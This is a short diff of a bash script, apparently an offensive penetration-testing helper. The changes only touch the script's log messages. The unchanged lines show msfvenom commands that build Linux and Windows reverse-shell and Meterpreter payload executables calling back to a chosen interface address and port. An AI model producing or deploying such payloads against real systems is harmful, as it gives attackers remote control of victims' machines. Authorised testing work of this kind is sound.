@@ -204,7 +204,7 @@ shell_creation() {
   selected_interface=$(zenity --list --title="Select Network Interface" --text="Choose your network interface:" --column="Interfaces" $interfaces)
 
   if [[ -z "$selected_interface" ]]; then
-    echo "No interface selected. Exiting."
+    print_message "error" "No interface selected. Exiting."
     exit 1
   fi
 
@@ -216,10 +216,10 @@ shell_creation() {
     exit 1
   fi
 
-  print_message "Selected interface is: $selected_interface"
-  print_message "Interface address is: $ip_addr"
-  print_message "Port being used for shells is $listen_port"
-  print_message "blue" "                                                   Nice"
+  print_message "info" "Selected interface is: $selected_interface"
+  print_message "info" "Interface address is: $ip_addr"
+  print_message "info" "Port being used for shells is $listen_port"
+  print_message "good" "                                                   Nice"
   msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/meter_rev_test.elf
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f exe > /tmp/test.exe
